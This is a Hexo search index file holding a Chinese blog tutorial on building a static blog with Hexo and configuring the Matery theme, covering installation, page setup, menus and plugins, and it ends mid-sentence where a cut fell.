<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hexo搭建个人博客系列：基础建站篇</title>
      <link href="/2022/01/19/hexo-da-jian-ge-ren-bo-ke-xi-lie-ji-chu-jian-zhan-pian/"/>
      <url>/2022/01/19/hexo-da-jian-ge-ren-bo-ke-xi-lie-ji-chu-jian-zhan-pian/</url>
      
        <content type="html"><![CDATA[<p>Hexo 是一个高效简洁的静态博客框架，支持 Markdown 写作语法，插件丰富，主题优雅，部署方便。目前已成为多数人博客建站的选择。</p><h1 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h1><p>使用命令行中通过 npm 来安装 Hexo：</p><pre class="line-numbers language-none"><code class="language-none">npm install -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>-g</code> 表示全局安装，会将 Hexo 命令加入环境变量中，以使其在 cmd 下有效。</p><p>Hexo 依赖于 <a href="https://nodejs.org/zh-cn/">Node.js</a> 和 <a href="https://git-scm.com/download/">git</a>，所以在安装 Hexo 之前先确保已安装了这两项应用。</p><p>新建博客目录，然后在该路径下执行初始化命令：</p><pre class="line-numbers language-none"><code class="language-none">hexo init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>官方教程中提到要在项目目录下执行 <code>npm install</code> 命令，事实上不必如此，在执行 <code>hexo init</code> 的过程中就已经自动安装好了项目依赖。</p><p>执行完毕后，将会生成以下文件结构：</p><pre class="line-numbers language-none"><code class="language-none">.├── node_modules       &#x2F;&#x2F;依赖安装目录├── scaffolds          &#x2F;&#x2F;模板文件夹，新建的文章将会从此目录下的文件中继承格式|   ├── draft.md         &#x2F;&#x2F;草稿模板|   ├── page.md          &#x2F;&#x2F;页面模板|   └── post.md          &#x2F;&#x2F;文章模板├── source             &#x2F;&#x2F;资源文件夹，用于放置图片、数据、文章等资源|   └── _posts           &#x2F;&#x2F;文章目录├── themes             &#x2F;&#x2F;主题文件夹|   └── landscape        &#x2F;&#x2F;默认主题├── .gitignore         &#x2F;&#x2F;指定不纳入git版本控制的文件├── _config.yml        &#x2F;&#x2F;站点配置文件├── db.json            ├── package.json└── package-lock.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在根目录下执行如下命令启动 hexo 的内置 Web 服务器</p><pre class="line-numbers language-none"><code class="language-none">hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该命令将会调用 Markdown 引擎解析项目中的博客内容生成网页资源，资源将会存于内存中，所以用户执行完命令之后在项目文件夹中是找不到相关的 Web 资源目录的。该命令还会启动一个简易的 Web 服务器用于提供对内存中网页资源的访问（工作机制类似于 webpack-dev-server），Web 服务器默认监听 4000 端口，用户可在浏览器中通过地址 <code>localhost:4000</code> 访问博客。</p><p><a href="http://yearito-1256884783.image.myqcloud.com/hexo-get-started/20181102070503130.png"><img src="http://yearito-1256884783.image.myqcloud.com/hexo-get-started/20181102070503130.png" alt="Hexo 默认主题首页"></a></p><p><a href="http://yearito-1256884783.image.myqcloud.com/hexo-get-started/20181102070503130.png">Hexo 默认主题首页</a></p><p>此外，可以通过添加命令行参数来支持高级用法：</p><ul><li>当 4000 端口已被其他应用占用时，可以添加 <code>-p</code> / <code>--port</code> 参数来设置 Web 服务监听的端口号，如<code>hexo s -p 8000</code></li><li>默认情况下，hexo 监听项目目录的文件变化，用户对于项目文件的任何改动都会触发实时解析编译并更新内存中的网页资源，也就是说，用户在本地修改后刷新浏览器就可以看到改动效果。如果不希望 hexo 监听项目目录的文件变化，可以添加 <code>-s</code> / <code>--static</code> 参数，这样本地改动就不会触发 hexo 实时解析更新。</li></ul><h1 id="更换-Matery主题"><a href="#更换-Matery主题" class="headerlink" title="更换 Matery主题"></a>更换 Matery主题</h1><ul><li><p>下载</p><p>本主题<strong>推荐你使用 Hexo 5.0.0 及以上的版本</strong>。如果，你已经有一个自己的 <a href="https://hexo.io/zh-cn/">Hexo</a> 博客了，建议你将 Hexo 升级到最新稳定的版本。</p><p>点击 <a href="https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master">这里</a> 下载 <code>master</code> 分支的最新稳定版的代码，解压缩后，将 <code>hexo-theme-matery</code> 的文件夹复制到你 Hexo 的 <code>themes</code> 文件夹中即可。</p><p>当然你也可以在你的 <code>themes</code> 文件夹下使用 <code>git clone</code> 命令来下载:</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;blinkfox&#x2F;hexo-theme-matery.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 的 <code>theme</code> 的值：<code>theme: hexo-theme-matery</code></p><h4 id="config-yml-文件的其它修改建议"><a href="#config-yml-文件的其它修改建议" class="headerlink" title="_config.yml 文件的其它修改建议:"></a><code>_config.yml</code> 文件的其它修改建议:</h4><ul><li>请修改 <code>_config.yml</code> 的 <code>url</code> 的值为你的网站主 <code>URL</code>（如：<code>http://xxx.github.io</code>）。</li><li>建议修改两个 <code>per_page</code> 的分页条数值为 <code>6</code> 的倍数，如：<code>12</code>、<code>18</code> 等，这样文章列表在各个屏幕下都能较好的显示。</li><li>如果你是中文用户，则建议修改 <code>language</code> 的值为 <code>zh-CN</code>。</li></ul><h3 id="新建分类-categories-页"><a href="#新建分类-categories-页" class="headerlink" title="新建分类 categories 页"></a>新建分类 categories 页</h3><p><code>categories</code> 页是用来展示所有分类的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>categories/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-none"><code class="language-none">hexo new page &quot;categories&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/categories/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-none"><code class="language-none">---title: categoriesdate: 2018-09-30 17:25:30type: &quot;categories&quot;layout: &quot;categories&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建标签-tags-页"><a href="#新建标签-tags-页" class="headerlink" title="新建标签 tags 页"></a>新建标签 tags 页</h3><p><code>tags</code> 页是用来展示所有标签的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>tags/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-none"><code class="language-none">hexo new page &quot;tags&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/tags/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-none"><code class="language-none">---title: tagsdate: 2018-09-30 18:23:38type: &quot;tags&quot;layout: &quot;tags&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建关于我-about-页"><a href="#新建关于我-about-页" class="headerlink" title="新建关于我 about 页"></a>新建关于我 about 页</h3><p><code>about</code> 页是用来展示<strong>关于我和我的博客</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>about/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-none"><code class="language-none">hexo new page &quot;about&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/about/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-none"><code class="language-none">---title: aboutdate: 2018-09-30 17:25:30type: &quot;about&quot;layout: &quot;about&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建留言板-contact-页（可选的）"><a href="#新建留言板-contact-页（可选的）" class="headerlink" title="新建留言板 contact 页（可选的）"></a>新建留言板 contact 页（可选的）</h3><p><code>contact</code> 页是用来展示<strong>留言板</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>contact/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-none"><code class="language-none">hexo new page &quot;contact&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/contact/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-none"><code class="language-none">---title: contactdate: 2018-09-30 17:25:30type: &quot;contact&quot;layout: &quot;contact&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：本留言板功能依赖于第三方评论系统，请<strong>激活</strong>你的评论系统才有效果。并且在主题的 <code>_config.yml</code> 文件中，第 <code>19</code> 至 <code>21</code> 行的“<strong>菜单</strong>”配置，取消关于留言板的注释即可。</p></blockquote><h3 id="新建友情链接-friends-页（可选的）"><a href="#新建友情链接-friends-页（可选的）" class="headerlink" title="新建友情链接 friends 页（可选的）"></a>新建友情链接 friends 页（可选的）</h3><p><code>friends</code> 页是用来展示<strong>友情链接</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>friends/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-none"><code class="language-none">hexo new page &quot;friends&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/friends/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-none"><code class="language-none">---title: friendsdate: 2018-12-12 21:25:30type: &quot;friends&quot;layout: &quot;friends&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时，在你的博客 <code>source</code> 目录下新建 <code>_data</code> 目录，在 <code>_data</code> 目录中新建 <code>friends.json</code> 文件，文件内容如下所示：</p><pre class="line-numbers language-none"><code class="language-none">[&#123;    &quot;avatar&quot;: &quot;http:&#x2F;&#x2F;image.luokangyuan.com&#x2F;1_qq_27922023.jpg&quot;,    &quot;name&quot;: &quot;码酱&quot;,    &quot;introduction&quot;: &quot;我不是大佬，只是在追寻大佬的脚步&quot;,    &quot;url&quot;: &quot;http:&#x2F;&#x2F;luokangyuan.com&#x2F;&quot;,    &quot;title&quot;: &quot;前去学习&quot;&#125;, &#123;    &quot;avatar&quot;: &quot;http:&#x2F;&#x2F;image.luokangyuan.com&#x2F;4027734.jpeg&quot;,    &quot;name&quot;: &quot;闪烁之狐&quot;,    &quot;introduction&quot;: &quot;编程界大佬，技术牛，人还特别好，不懂的都可以请教大佬&quot;,    &quot;url&quot;: &quot;https:&#x2F;&#x2F;blinkfox.github.io&#x2F;&quot;,    &quot;title&quot;: &quot;前去学习&quot;&#125;, &#123;    &quot;avatar&quot;: &quot;http:&#x2F;&#x2F;image.luokangyuan.com&#x2F;avatar.jpg&quot;,    &quot;name&quot;: &quot;ja_rome&quot;,    &quot;introduction&quot;: &quot;平凡的脚步也可以走出伟大的行程&quot;,    &quot;url&quot;: &quot;https:&#x2F;&#x2F;me.csdn.net&#x2F;jlh912008548&quot;,    &quot;title&quot;: &quot;前去学习&quot;&#125;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建-404-页"><a href="#新建-404-页" class="headerlink" title="新建 404 页"></a>新建 404 页</h3><p>如果在你的博客 <code>source</code> 目录下还没有 <code>404.md</code> 文件，那么你就需要新建一个</p><pre class="line-numbers language-none"><code class="language-none">hexo new page 404<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/404/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-none"><code class="language-none">---title: 404date: 2018-09-30 17:25:30type: &quot;404&quot;layout: &quot;404&quot;description: &quot;Oops～，我崩溃了！找不到你想要的页面 :(&quot;---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="菜单导航配置"><a href="#菜单导航配置" class="headerlink" title="菜单导航配置"></a>菜单导航配置</h3><h4 id="配置基本菜单导航的名称、路径url和图标icon"><a href="#配置基本菜单导航的名称、路径url和图标icon" class="headerlink" title="配置基本菜单导航的名称、路径url和图标icon."></a>配置基本菜单导航的名称、路径url和图标icon.</h4><p>1.菜单导航名称可以是中文也可以是英文(如：<code>Index</code>或<code>主页</code>) 2.图标icon 可以在<a href="https://fontawesome.com/icons">Font Awesome</a> 中查找</p><pre class="line-numbers language-none"><code class="language-none">menu:  Index:    url: &#x2F;    icon: fas fa-home  Tags:    url: &#x2F;tags    icon: fas fa-tags  Categories:    url: &#x2F;categories    icon: fas fa-bookmark  Archives:    url: &#x2F;archives    icon: fas fa-archive  About:    url: &#x2F;about    icon: fas fa-user-circle  Friends:    url: &#x2F;friends    icon: fas fa-address-book<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="二级菜单配置方法"><a href="#二级菜单配置方法" class="headerlink" title="二级菜单配置方法"></a>二级菜单配置方法</h4><p>如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作</p><ol><li>在需要添加二级菜单的一级菜单下添加<code>children</code>关键字(如:<code>About</code>菜单下添加<code>children</code>)</li><li>在<code>children</code>下创建二级菜单的 名称name,路径url和图标icon.</li><li>注意每个二级菜单模块前要加 <code>-</code>.</li><li>注意缩进格式</li></ol><pre class="line-numbers language-none"><code class="language-none">menu:  Index:    url: &#x2F;    icon: fas fa-home  Tags:    url: &#x2F;tags    icon: fas fa-tags  Categories:    url: &#x2F;categories    icon: fas fa-bookmark  Archives:    url: &#x2F;archives    icon: fas fa-archive  About:    url: &#x2F;about    icon: fas fa-user-circle-o  Friends:    url: &#x2F;friends    icon: fas fa-address-book  Medias:    icon: fas fa-list    children:      - name: Music        url: &#x2F;music        icon: fas fa-music      - name: Movies        url: &#x2F;movies        icon: fas fa-film      - name: Books        url: &#x2F;books        icon: fas fa-book      - name: Galleries        url: &#x2F;galleries        icon: fas fa-image<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h3><p>从 Hexo5.0 版本开始自带了 <code>prismjs</code> 代码语法高亮的支持，本主题对此进行了改造支持。</p><p>如果你的博客中曾经安装过 <code>hexo-prism-plugin</code> 的插件，那么你须要执行 <code>npm uninstall hexo-prism-plugin</code> 来卸载掉它，否则生成的代码中会有 <code>&#123;</code> 和 <code>&#125;</code> 的转义字符。</p><p>然后，修改 Hexo 根目录下 <code>_config.yml</code> 文件中 <code>highlight.enable</code> 的值为 <code>false</code>，并将 <code>prismjs.enable</code> 的值设置为 <code>true</code>，主要配置如下：</p><pre class="line-numbers language-none"><code class="language-none">highlight:  enable: false  line_number: true  auto_detect: false  tab_replace: &#39;&#39;  wrap: true  hljs: falseprismjs:  enable: true  preprocess: true  line_number: true  tab_replace: &#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主题中默认的 <code>prismjs</code> 主题是 <code>Tomorrow Night</code>，如果你想定制自己的主题，可以前往 <a href="https://prismjs.com/download.html">prismjs 下载页面</a> 定制下载自己喜欢的主题 <code>css</code> 文件，然后将此 css 主题文件取名为 <code>prism.css</code>，替换掉 <code>hexo-theme-matery</code> 主题文件夹中的 <code>source/libs/prism/prism.css</code> 文件即可。</p><h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><p>本主题中还使用到了 <a href="https://github.com/wzpan/hexo-generator-search">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下：</p><pre class="line-numbers language-none"><code class="language-none">npm install hexo-generator-search --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-none"><code class="language-none">search:  path: search.xml  field: post<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="中文链接转拼音（建议安装）"><a href="#中文链接转拼音（建议安装）" class="headerlink" title="中文链接转拼音（建议安装）"></a>中文链接转拼音（建议安装）</h3><p>如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 <code>SEO</code>，且 <code>gitment</code> 评论对中文链接也不支持。我们可以用 <a href="https://github.com/viko16/hexo-permalink-pinyin">hexo-permalink-pinyin</a> Hexo 插件使在生成文章时生成中文拼音的永久链接。</p><p>安装命令如下：</p><pre class="line-numbers language-none"><code class="language-none">npm i hexo-permalink-pinyin --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-none"><code class="language-none">permalink_pinyin:  enable: true  separator: &#39;-&#39; # default: &#39;-&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：除了此插件外，<a href="https://github.com/rozbo/hexo-abbrlink">hexo-abbrlink</a> 插件也可以生成非中文的链接。</p></blockquote><h3 id="文章字数统计插件（建议安装）"><a href="#文章字数统计插件（建议安装）" class="headerlink" title="文章字数统计插件（建议安装）"></a>文章字数统计插件（建议安装）</h3><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 <a href="https://github.com/willin/hexo-wordcount">hexo-wordcount</a>插件。</p><p>安装命令如下：</p><pre class="line-numbers language-none"><code class="language-none">npm i --save hexo-wordcount<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后只需在本主题下的 <code>_config.yml</code> 文件中，将各个文章字数相关的配置激活即可：</p><pre class="line-numbers language-none"><code class="language-none">postInfo:  date: true  update: false  wordCount: false # 设置文章字数统计为 true.  totalCount: false # 设置站点文章总字数统计为 true.  min2read: false # 阅读时长.  readCount: false # 阅读次数.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加emoji表情支持（可选的）"><a href="#添加emoji表情支持（可选的）" class="headerlink" title="添加emoji表情支持（可选的）"></a>添加emoji表情支持（可选的）</h3><p>本主题新增了对<code>emoji</code>表情的支持，使用到了 <a href="https://npm.taobao.org/package/hexo-filter-github-emojis">hexo-filter-github-emojis</a> 的 Hexo 插件来支持 <code>emoji</code>表情的生成，把对应的<code>markdown emoji</code>语法（<code>::</code>,例如：<code>:smile:</code>）转变成会跳跃的<code>emoji</code>表情，安装命令如下：</p><pre class="line-numbers language-none"><code class="language-none">npm install hexo-filter-github-emojis --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-none"><code class="language-none">githubEmojis:  enable: true  className: github-emoji  inject: true  styles:  customEmojis:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后就可以在文章中对应位置看到你用<code>emoji</code>语法写的表情了。</p><h3 id="添加-RSS-订阅支持（可选的）"><a href="#添加-RSS-订阅支持（可选的）" class="headerlink" title="添加 RSS 订阅支持（可选的）"></a>添加 RSS 订阅支持（可选的）</h3><p>本主题中还使用到了 <a href="https://github.com/hexojs/hexo-generator-feed">hexo-generator-feed</a> 的 Hexo 插件来做 <code>RSS</code>，安装命令如下：</p><pre class="line-numbers language-none"><code class="language-none">npm install hexo-generator-feed --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-none"><code class="language-none">feed:  type: atom  path: atom.xml  limit: 20  hub:  content:  content_limit: 140  content_limit_delim: &#39; &#39;  order_by: -date<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后在 <code>public</code> 文件夹中即可看到 <code>atom.xml</code> 文件，说明你已经安装成功了。</p><h3 id="添加-DaoVoice-在线聊天功能（可选的）"><a href="#添加-DaoVoice-在线聊天功能（可选的）" class="headerlink" title="添加 DaoVoice 在线聊天功能（可选的）"></a>添加 <a href="http://www.daovoice.io/">DaoVoice</a> 在线聊天功能（可选的）</h3><p>前往 <a href="http://www.daovoice.io/">DaoVoice</a> 官网注册并且获取 <code>app_id</code>，并将 <code>app_id</code> 填入主题的 <code>_config.yml</code> 文件中。</p><h3 id="添加-Tidio-在线聊天功能（可选的）"><a href="#添加-Tidio-在线聊天功能（可选的）" class="headerlink" title="添加 Tidio 在线聊天功能（可选的）"></a>添加 <a href="https://www.tidio.com/">Tidio</a> 在线聊天功能（可选的）</h3><p>前往 <a href="https://www.tidio.com/">Tidio</a> 官网注册并且获取 <code>Public Key</code>，并将 <code>Public Key</code> 填入主题的 <code>_config.yml</code> 文件中。</p><h3 id="修改页脚"><a href="#修改页脚" class="headerlink" title="修改页脚"></a>修改页脚</h3><p>页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 <code>/layout/_partial/footer.ejs</code> 文件中，包括站点、使用的主题、访问量等。</p><h3 id="修改社交链接"><a href="#修改社交链接" class="headerlink" title="修改社交链接"></a>修改社交链接</h3><p>在主题的 <code>_config.yml</code> 文件中，默认支持 <code>QQ</code>、<code>GitHub</code> 和邮箱等的配置，你可以在主题文件的 <code>/layout/_partial/social-link.ejs</code> 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：</p><pre class="line-numbers language-none"><code class="language-none">&lt;% if (theme.socialLink.github) &#123; %&gt;    &lt;a href&#x3D;&quot;&lt;%&#x3D; theme.socialLink.github %&gt;&quot; class&#x3D;&quot;tooltipped&quot; target&#x3D;&quot;_blank&quot; data-tooltip&#x3D;&quot;访问我的GitHub&quot; data-position&#x3D;&quot;top&quot; data-delay&#x3D;&quot;50&quot;&gt;        &lt;i class&#x3D;&quot;fab fa-github&quot;&gt;&lt;&#x2F;i&gt;    &lt;&#x2F;a&gt;&lt;% &#125; %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，社交图标（如：<code>fa-github</code>）你可以在 <a href="https://fontawesome.com/icons">Font Awesome</a> 中搜索找到。以下是常用社交图标的标识，供你参考：</p><ul><li>Facebook: <code>fab fa-facebook</code></li><li>Twitter: <code>fab fa-twitter</code></li><li>Google-plus: <code>fab fa-google-plus</code></li><li>Linkedin: <code>fab fa-linkedin</code></li><li>Tumblr: <code>fab fa-tumblr</code></li><li>Medium: <code>fab fa-medium</code></li><li>Slack: <code>fab fa-slack</code></li><li>Sina Weibo: <code>fab fa-weibo</code></li><li>Wechat: <code>fab fa-weixin</code></li><li>QQ: <code>fab fa-qq</code></li><li>Zhihu: <code>fab fa-zhihu</code></li></ul><blockquote><p><strong>注意</strong>: 本主题中使用的 <code>Font Awesome</code> 版本为 <code>5.11.0</code>。</p></blockquote><h3 id="修改打赏的二维码图片"><a href="#修改打赏的二维码图片" class="headerlink" title="修改打赏的二维码图片"></a>修改打赏的二维码图片</h3><p>在主题文件的 <code>source/medias/reward</code> 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。</p><h3 id="配置音乐播放器（可选的）"><a href="#配置音乐播放器（可选的）" class="headerlink" title="配置音乐播放器（可选的）"></a>配置音乐播放器（可选的）</h3><p>要支持音乐播放，在主题的 <code>_config.yml</code> 配置文件中激活music配置即可：</p><pre class="line-numbers language-none"><code class="language-none"># 是否在首页显示音乐music:  enable: true  title:         # 非吸底模式有效    enable: true    show: 听听音乐  server: netease   # require music platform: netease, tencent, kugou, xiami, baidu  type: playlist    # require song, playlist, album, search, artist  id: 503838841     # require song id &#x2F; playlist id &#x2F; album id &#x2F; search keyword  fixed: false      # 开启吸底模式  autoplay: false   # 是否自动播放  theme: &#39;#42b983&#39;  loop: &#39;all&#39;       # 音频循环播放, 可选值: &#39;all&#39;, &#39;one&#39;, &#39;none&#39;  order: &#39;random&#39;   # 音频循环顺序, 可选值: &#39;list&#39;, &#39;random&#39;  preload: &#39;auto&#39;   # 预加载，可选值: &#39;none&#39;, &#39;metadata&#39;, &#39;auto&#39;  volume: 0.7       # 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效  listFolded: true  # 列表默认折叠<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>server</code>可选<code>netease</code>（网易云音乐），<code>tencent</code>（QQ音乐），<code>kugou</code>（酷狗音乐），<code>xiami</code>（虾米音乐），</p><p><code>baidu</code>（百度音乐）。</p><p><code>type</code>可选<code>song</code>（歌曲），<code>playlist</code>（歌单），<code>album</code>（专辑），<code>search</code>（搜索关键字），<code>artist</code>（歌手）</p><pre class="line-numbers language-none"><code class="language-none">id&#96;获取方法示例: 浏览器打开网易云音乐，点击我喜欢的音乐歌单，浏览器地址栏后面会有一串数字，&#96;playlist&#96;的&#96;id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即为这串数字。</p></blockquote><h2 id="文章-Front-matter-介绍"><a href="#文章-Front-matter-介绍" class="headerlink" title="文章 Front-matter 介绍"></a>文章 Front-matter 介绍</h2><h3 id="Front-matter-选项详解"><a href="#Front-matter-选项详解" class="headerlink" title="Front-matter 选项详解"></a>Front-matter 选项详解</h3><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 <code>_config.yml</code> 中的 <code>author</code></td><td>文章作者</td></tr><tr><td>img</td><td><code>featureImages</code> 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td></tr><tr><td>hide</td><td><code>false</code></td><td>隐藏文章，如果<code>hide</code>值为<code>true</code>，则文章不会在首页显示</td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td></tr><tr><td>toc</td><td><code>true</code></td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr><tr><td>keywords</td><td>文章标题</td><td>文章关键字，SEO 时需要</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><blockquote><p><strong>注意</strong>:</p><ol><li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章的特色图<strong>各有特色</strong>。</li><li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 <code>date</code> 的值来作为唯一标识的。</li><li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a href="http://tool.oschina.net/encrypt?type=2">开源中国在线工具</a>、<a 